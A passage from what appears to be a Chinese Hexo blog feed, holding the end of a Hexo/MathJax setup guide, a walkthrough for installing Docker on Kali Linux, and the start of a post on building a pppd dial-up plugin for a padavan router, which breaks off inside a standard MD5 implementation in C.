class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于markdown语法与mathjax语法存在冲突，所以还需要修改源文件。</p><p>打开<code>D:\study\program\blog\node_modules\marked\lib\marked.js</code><br><code>escape:</code>处替换成：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escape: /^$[`*\[\]()#$+\-.!_&gt;])/</span><br></pre></td></tr></table></figure><p><code>em:</code>处替换成：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span><br></pre></td></tr></table></figure><p>这时在文章里写数学公式基本没有问题了，但是要注意：<br><strong>数学公式中如果出现了连续两个{，中间一定要加空格！</strong></p><p>举个例子:<br>行内公式：y=f(x)y=f(x)<br>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$y &#x3D; f(x)$</span><br></pre></td></tr></table></figure><p>行间公式：</p><p>y=fg1(x)y=fg1(x)</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\[y &#x3D; &#123;f_&#123; &#123;g_1&#125;&#125;&#125;(x)\\]</span><br></pre></td></tr></table></figure><p><strong>注意上面花括号之间有空格！</strong></p><h2 id="添加留言板"><a class="header-anchor" href="#添加留言板"></a>添加留言板</h2><p>在<code>D:\study\program\blog\themes\beantech\layout</code>中新建<code>bbs.ejs</code>，文件内容如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">layout: page</span><br><span class="line">---</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">header</span><span class="selector-class">.intro-header</span>&#123;</span></span><br><span class="line">        background-position: right; </span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Chinese Version --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"zh post-container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%-</span> <span class="attr">page.content</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在<code>D:\study\program\blog\source</code>中新建<code>\bbs</code>文件夹，里面在新建<code>index.md</code>文件，内容如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">layout: "bbs"</span><br><span class="line">title: "BBS"</span><br><span class="line">date: 2017-09-19 12:48:33</span><br><span class="line">description: "欢迎交换友链，一起交流学习！"</span><br><span class="line">header-img: "img/header_img/home-bg-2-dark.png"</span><br><span class="line">comments: true</span><br><span class="line">---</span><br><span class="line">此处替换为你的畅言评论代码~~~</span><br></pre></td></tr></table></figure><h2 id="文章属性配置"><a class="header-anchor" href="#文章属性配置"></a>文章属性配置</h2><p>首先解释一下文章开头的属性配置，如下图所示：</p><p><img src="https://godweiyang.com/2018/04/13/hexo-blog/19.jpg" alt="img"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">title: 文章标题</span><br><span class="line">catalog: 是否显示段落目录</span><br><span class="line">date: 文章日期</span><br><span class="line">subtitle: 子标题</span><br><span class="line">header-img: 顶部背景图片</span><br><span class="line">top: 是否置顶</span><br><span class="line">tags: 标签</span><br><span class="line">categories: 分类</span><br></pre></td></tr></table></figure><p>每次写文章修改每个值就行了。</p><p>转载规则</p><p><a href="https://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="noopener"><img src="https://i.creativecommons.org/l/by/4.0/88x31.png" alt="img"></a></p><p>《超详细Hexo+Github博客搭建小白教程》 <a href="https://godweiyang.com/2018/04/13/hexo-blog/" target="_blank" rel="noopener">韦阳 </a><a href="https://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="noopener">知识共享署名 4.0 国际许可协议 </a></p>]]></content>
      
      
      <categories>
          
          <category> 折腾纪实 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker入坑一	Docker的安装与使用</title>
      <link href="/p/d48e584d.html"/>
      <url>/p/d48e584d.html</url>
      
        <content type="html"><![CDATA[<h1>Docker入坑一Docker的安装与使用</h1><h3 id="安装环境要求："><a class="header-anchor" href="#安装环境要求："></a>安装环境要求：</h3><p><code>Linux</code>安装<code>Docker</code>要求:</p><p>Linux 内核版本最小为<code>3.10</code>，或者<code>3.10</code>以上版本，并且系统版本为<code>64-bit</code>。</p><a id="more"></a><p>查看<code>Linux</code>系统内核信息:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>我本次安装的系统如下：</p><p><img src="http://pic.storysec.com/2019/docker20190111194417.jpg" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux kali 4.18.0-kali2-amd64 #1 SMP Debian 4.18.10-2kali1 (2018-10-09) x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><h2 id="下面开始安装："><a class="header-anchor" href="#下面开始安装："></a>下面开始安装：</h2><h3 id="添加更新源："><a class="header-anchor" href="#添加更新源："></a>添加更新源：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list.d/backports.list</span><br><span class="line">deb http://http.debian.net/debian wheezy-backports main</span><br></pre></td></tr></table></figure><h3 id="更新APT软件包索引："><a class="header-anchor" href="#更新APT软件包索引："></a>更新<code>APT</code>软件包索引：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><h3 id="如果之前有安装过docker，则先删除旧版本："><a class="header-anchor" href="#如果之前有安装过docker，则先删除旧版本："></a>如果之前有安装过<code>docker</code>，则先删除旧版本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get purge lxc-docker*</span><br><span class="line">apt-get purge docker.io*</span><br><span class="line">apt-get update</span><br></pre></td></tr></table></figure><h3 id="确认APT添加了https协议和CA证书："><a class="header-anchor" href="#确认APT添加了https协议和CA证书："></a>确认<code>APT</code>添加了<code>https</code>协议和<code>CA</code>证书：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure><h3 id="添加一个新的GPG密钥"><a class="header-anchor" href="#添加一个新的GPG密钥"></a>添加一个新的<code>GPG</code>密钥:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</span><br></pre></td></tr></table></figure><h3 id="Docker-支持以下版本的-Debian："><a class="header-anchor" href="#Docker-支持以下版本的-Debian："></a>Docker 支持以下版本的 Debian：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Debian testing stretch (64-bit)</span><br><span class="line"></span><br><span class="line">Debian 8.0 Jessie (64-bit)</span><br><span class="line"></span><br><span class="line">Debian 7.7 Wheezy (64-bit)</span><br></pre></td></tr></table></figure><p>因为<code>Kali2.0</code>是基于<code>Debian Wheezy</code>版本，添加更新源，增加相关内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list.d/docker.list</span><br><span class="line"><span class="comment">#Debian Wheezy</span></span><br><span class="line">deb https://apt.dockerproject.org/repo debian-wheezy main</span><br></pre></td></tr></table></figure><h3 id="保存后，再次更新APT软件包索引："><a class="header-anchor" href="#保存后，再次更新APT软件包索引："></a>保存后，再次更新<code>APT</code>软件包索引：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><h3 id="确认APT能从正确的repository仓库拉取内容"><a class="header-anchor" href="#确认APT能从正确的repository仓库拉取内容"></a>确认<code>APT</code>能从正确的<code>repository</code>仓库拉取内容:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache policy docker-engine</span><br></pre></td></tr></table></figure><h3 id="正式安装docker："><a class="header-anchor" href="#正式安装docker："></a>正式安装<code>docker</code>：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install docker-engine</span><br></pre></td></tr></table></figure><h3 id="启动docker服务"><a class="header-anchor" href="#启动docker服务"></a>启动<code>docker</code>服务:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><h3 id="安装compose"><a class="header-anchor" href="#安装compose"></a>安装<code>compose</code>:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure><h3 id="验证安装，运行测试"><a class="header-anchor" href="#验证安装，运行测试"></a>验证安装，运行测试:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>界面显示如下,表示成功安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># docker run hello-world</span></span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="http://pic.storysec.com/2019/docker20190111205846.jpg" alt="img"></p><h3 id="查看版本："><a class="header-anchor" href="#查看版本："></a>查看版本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># docker version</span></span><br><span class="line">Client:</span><br><span class="line"> Version:      17.05.0-ce</span><br><span class="line"> API version:  1.29</span><br><span class="line"> Go version:   go1.7.5</span><br><span class="line"> Git commit:   89658be</span><br><span class="line"> Built:        Thu May  4 22:13:40 2017</span><br><span class="line"> OS/Arch:      linux/amd64</span><br><span class="line"></span><br><span class="line">Server:</span><br><span class="line"> Version:      17.05.0-ce</span><br><span class="line"> API version:  1.29 (minimum version 1.12)</span><br><span class="line"> Go version:   go1.7.5</span><br><span class="line"> Git commit:   89658be</span><br><span class="line"> Built:        Thu May  4 22:13:40 2017</span><br><span class="line"> OS/Arch:      linux/amd64</span><br><span class="line"> Experimental: <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>接下来，开启 docker 的折腾之路！</p>]]></content>
      
      
      <categories>
          
          <category> 折腾纪实 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译padavan平台的天翼飞young3.10pppd拨号插件</title>
      <link href="/p/83845ae9.html"/>
      <url>/p/83845ae9.html</url>
      
        <content type="html"><![CDATA[<p>这大概是大二的时候做的了，但是博客一直断断续续，也没有放出来，正好重新搭建了博客，就整理一下放上来吧。</p><blockquote><p>前言： 这是本人在无聊的时候折腾电信天翼拨号的一点心得，并附上了我的渣渣代码，有兴趣的同 学可以拿去研究一下。顺便感谢当年那位逆向天翼 mac 客户端并写出算法的牛逼学长。</p></blockquote><p>由于我校电信的拨号一直是天翼飞young，就是简单的加密pppoe帐号，还没有其他地方心跳包那些骚操作，所以这个方法的稳定性一直非常好。原本是用脚本算号，再用加密后的帐号密码拨号的，但是实在是麻烦，就干脆做了这个插件，路由器自动调用插件算号拨号，无缝切换美滋滋。</p><a id="more"></a><p>以 下正文：</p><h2 id="0x00-首先准备工具链"><a class="header-anchor" href="#0x00-首先准备工具链"></a>0x00 首先准备工具链</h2><p>由于我的路由器是padavan平台的，所以参考官网教程，添加工具链交叉编译。（openwrt的在Netkeeper大佬的GitHub上已给出，clone即可。）</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://bitbucket.org/padavan/rt-n56u/wiki/EN/HowToMakeFirmware</span></span><br></pre></td></tr></table></figure><h2 id="0x01-把原来的python代码改成c语言"><a class="header-anchor" href="#0x01-把原来的python代码改成c语言"></a>0x01 把原来的python代码改成c语言</h2><p>参考了 github 上某大佬分享的基于openwrt的netkeeper 插件源码</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://github.com/miao1007/Openwrt-NetKeeper</span></span><br></pre></td></tr></table></figure><p>这部分大家可以直接拿来用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">//TODO : you may obtaion it by git clone https://github.com/squadette/pppd.git</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pppd.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"md5.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="keyword">byte</span>;</span><br><span class="line"><span class="comment">//TODO : change the version here</span></span><br><span class="line"><span class="keyword">char</span> pppd_version[] = <span class="string">"2.4.7"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> saveuser[MAXNAMELEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> password[MAXSECRETLEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************************MD5实现***************************/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> PADDING[] = &#123; <span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Init</span><span class="params">(MD5_CTX *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">context-&gt;count[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">context-&gt;count[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">context-&gt;state[<span class="number">0</span>] = <span class="number">0x67452301</span>;</span><br><span class="line">context-&gt;state[<span class="number">1</span>] = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">context-&gt;state[<span class="number">2</span>] = <span class="number">0x98BADCFE</span>;</span><br><span class="line">context-&gt;state[<span class="number">3</span>] = <span class="number">0x10325476</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MD5Update</span><span class="params">(MD5_CTX *context, <span class="keyword">unsigned</span> <span class="keyword">char</span> *input, <span class="keyword">unsigned</span> <span class="keyword">int</span> inputlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, index = <span class="number">0</span>, partlen = <span class="number">0</span>;</span><br><span class="line">index = (context-&gt;count[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">partlen = <span class="number">64</span> - index;</span><br><span class="line">context-&gt;count[<span class="number">0</span>] += inputlen &lt;&lt; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (context-&gt;count[<span class="number">0</span>] &lt; (inputlen &lt;&lt; <span class="number">3</span>))</span><br><span class="line">context-&gt;count[<span class="number">1</span>]++;</span><br><span class="line">context-&gt;count[<span class="number">1</span>] += inputlen &gt;&gt; <span class="number">29</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (inputlen &gt;= partlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;context-&gt;<span class="built_in">buffer</span>[index], input, partlen);</span><br><span 